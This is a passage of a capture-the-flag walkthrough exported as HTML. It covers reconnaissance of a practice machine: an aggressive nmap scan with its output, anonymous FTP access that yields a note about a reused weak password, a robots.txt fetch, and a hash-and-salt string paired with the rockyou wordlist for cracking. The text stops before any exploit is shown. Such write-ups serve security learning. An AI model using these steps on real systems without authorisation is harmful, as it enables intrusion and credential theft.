<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Simple CTF</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
	margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(50, 48, 44, 1);
}
.highlight-gray {
	color: rgba(115, 114, 110, 1);
	fill: rgba(115, 114, 110, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(205, 60, 58, 1);
	fill: rgba(205, 60, 58, 1);
}
.highlight-default_background {
	color: rgba(50, 48, 44, 1);
}
.highlight-gray_background {
	background: rgba(248, 248, 247, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(248, 243, 252, 1);
}
.highlight-pink_background {
	background: rgba(252, 241, 246, 1);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(115, 114, 110, 1);
	fill: rgba(115, 114, 110, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(205, 60, 58, 1);
	fill: rgba(205, 60, 58, 1);
}
.block-color-default_background {
	color: inherit;
	fill: inherit;
}
.block-color-gray_background {
	background: rgba(248, 248, 247, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(248, 243, 252, 1);
}
.block-color-pink_background {
	background: rgba(252, 241, 246, 1);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-default { background-color: rgba(84, 72, 49, 0.08); }
.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="23f5b2cc-075b-8044-ad14-d5ad6950ddbb" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="https://www.notion.so/icons/alien_pink.svg"/></div><h1 class="page-title"><strong>Simple CTF</strong></h1><p class="page-description"></p></header><div class="page-body"><p id="23f5b2cc-075b-802b-a34d-e08d523b1f01" class="">
</p><ol type="1" id="23f5b2cc-075b-8059-bf5b-ce9d778a8fe7" class="numbered-list" start="1"><li>Enumeration<br/>I ran nmap and found that there are 3 ports open and one of it is a webserver on port 80</li></ol><figure id="23f5b2cc-075b-801d-aeae-c391ffb772ed" class="image"><a href="assets/224A1C00-7E67-45D3-AE0A-087461CA8BAC.png"><img style="width:528px" src="assets/224A1C00-7E67-45D3-AE0A-087461CA8BAC.png"/></a></figure><p id="23f5b2cc-075b-80aa-bf87-cb64d1880fb8" class="">but with the nmap scan script, i get a much better enumeration</p><figure id="23f5b2cc-075b-8064-be90-c1bd7528b233" class="image"><a href="assets/72BA702B-D769-463F-A924-47CEFAE61FDD.png"><img style="width:688px" src="assets/72BA702B-D769-463F-A924-47CEFAE61FDD.png"/></a></figure><p id="23f5b2cc-075b-8016-89a1-e13ed49f7662" class=""><br/><br/><code>0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt</code></p><figure id="23f5b2cc-075b-8062-8caf-d9ad01a15736" class="image"><a href="assets/image%2034.png"><img style="width:571px" src="assets/image%2034.png"/></a></figure><p id="23f5b2cc-075b-8042-9041-d2b488562d0e" class="">
</p><h2 id="23f5b2cc-075b-80a4-b5c3-c0587274233c" class="">First Steps: Enumeration</h2><p id="23f5b2cc-075b-80e4-9360-cfa19d52a79e" class="">The first step in any successful exploitation is to find an entry point. The tool of choice for this is, of course, <code>nmap</code>. nmap is a powerful tool that allows us to scan a target machine for open ports. We’ll use the aggressive (<code>-A</code>) option, as we aren’t in much danger of detection here. Let’s do this:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-8033-8483-fc2e6316036a" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">nmap -sS -A $TARGET_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-03 23:36 CEST
Nmap scan report for $TARGET_IP
Host is up (0.029s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can&#x27;t get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.11.9.172
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   28.20 ms $LOCAL_SUBNET_ID
2   28.84 ms $TARGET_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.33 seconds</code></pre><p id="23f5b2cc-075b-8093-9148-cd98a744b249" class="">It may be necessary to run this command with sudo, as the SYN scan requires elevated privileges.</p><p id="23f5b2cc-075b-80f6-822e-c4f59acad552" class="">There’s a lot of information here.</p><p id="23f5b2cc-075b-8098-bd0b-dbcdcd0c5afc" class="">First we seem to have 3 ports open:</p><ul id="23f5b2cc-075b-80e5-9799-e85781fd4020" class="bulleted-list"><li style="list-style-type:disc">21/ftp</li></ul><ul id="23f5b2cc-075b-8014-994f-f604e1a92b2d" class="bulleted-list"><li style="list-style-type:disc">80/http</li></ul><ul id="23f5b2cc-075b-80b5-a6d1-db72e4c4c0f7" class="bulleted-list"><li style="list-style-type:disc">2222/ssh</li></ul><p id="23f5b2cc-075b-8012-a747-ca6743826ec0" class="">This allows us to answer the first two questions:</p><p id="23f5b2cc-075b-8077-a883-f0b6b46e342b" class=""><strong>Question 1:</strong> How many services are running under port 1000? <code>2</code></p><p id="23f5b2cc-075b-80c1-bd53-d6965e0113b8" class=""><strong>Question 2:</strong> What is running on the higher port? <code>ssh</code></p><h2 id="23f5b2cc-075b-8032-8b58-d13c31efe984" class="">Next: Exploration</h2><p id="23f5b2cc-075b-80c6-b136-fa9d94efd455" class="">We have several promising openings, let’s explore them.</p><h3 id="23f5b2cc-075b-8093-960d-f24e32f1779e" class="">FTP</h3><p id="23f5b2cc-075b-805a-aef2-f8f5ecffe4fc" class="">ftp seems easy enough to access. Our <code>nmap</code> probe shows that anonymous access is allowed, sweet!</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-8000-930a-d76c4d32462d" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">ftp $TARGET_IP</code></pre><p id="23f5b2cc-075b-8045-b4c9-c73ae02b368e" class="">Bash</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-8069-9f24-dbbec283e01d" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">Connected to $TARGET_IP.
220 (vsFTPd 3.0.3)
Name ($TARGET_IP:hydra): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
cd pub
250 Directory successfully changed.
ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00 secs (334.2461 kB/s)
exit</code></pre><p id="23f5b2cc-075b-8059-8375-ec7126b3eefc" class="">
</p><p id="23f5b2cc-075b-8048-a823-f2fa29874930" class="">In the ftp root, there was a directory called <code>pub</code>. Inside there was a file called <code>ForMitch.txt</code>. We grabbed that file, let’s open it:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-801c-85c6-e84bd7e25d00" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">cat ForMitch.txt
Dammit man... you&#x27;te the worst dev i&#x27;ve seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!</code></pre><p id="23f5b2cc-075b-8090-af04-d6715bdb005e" class="">
</p><p id="23f5b2cc-075b-803c-b60e-dd90ebd498b2" class="">So we can glean three crucial pieces of information:</p><ol type="1" id="23f5b2cc-075b-80e0-be8d-e899e69787d0" class="numbered-list" start="1"><li>There’s a user on the system likely called <code>mitch</code></li></ol><ol type="1" id="23f5b2cc-075b-800d-9e39-ce4db0d14548" class="numbered-list" start="2"><li>He has the same password on some application as the system</li></ol><ol type="1" id="23f5b2cc-075b-80de-8039-f58acc47f7df" class="numbered-list" start="3"><li>His password is incredibly weak. We’ll likely be able to crack it with <code>rockyou.txt</code>, or if it’s a stronger hash, then a shorter list might also be able to crack it.</li></ol><p id="23f5b2cc-075b-80ed-8ae7-d74505f86583" class="">There’s nothing else on the ftp server, so let’s keep going.</p><h3 id="23f5b2cc-075b-80db-97f7-d8da7dd974f2" class="">HTTP</h3><p id="23f5b2cc-075b-8063-b5c3-d591781f0704" class="">Our <code>nmap</code> probe showed the presence of a <code>robots.txt</code> file on the server. Let’s see what’s on it:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-80f3-bb30-eec6d619dd2c" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">curl $TARGET_IP/robots.txt
#
# &quot;$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $&quot;
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   &quot;LICENSE.txt&quot; which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3
#
# End of &quot;$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $&quot;.
#</code></pre><p id="23f5b2cc-075b-80fa-8d8a-f78d602ba103" class="">
</p><p id="23f5b2cc-075b-80b4-aab3-d618129ce3b6" class="">What a mess! Let’s dissassemble what we found:</p><ul id="23f5b2cc-075b-8079-8d7c-cdf8d036fedf" class="bulleted-list"><li style="list-style-type:disc">We have a comment indicating the presence of a CUPS (Common UNIX Printing<br/>System) server. However, since none of the usual ports were open, we can discount this.</li></ul><ul id="23f5b2cc-075b-80d6-9bd6-ea4c602a300c" class="bulleted-list"><li style="list-style-type:disc">There’s possibly something at <code>/openemr-5_0_1_3</code> that we can check out.</li></ul><ul id="23f5b2cc-075b-80d1-b014-f2737fe56099" class="bulleted-list"><li style="list-style-type:disc">There may be a user called <code>mike</code> on the system. Perhaps he wrote the note to Mitch?</li></ul><p id="23f5b2cc-075b-80cd-b45b-fa454e3ca35c" class="">The only interesting thing we found is the openemr directory. Let’s see if there’s anything there</p><script 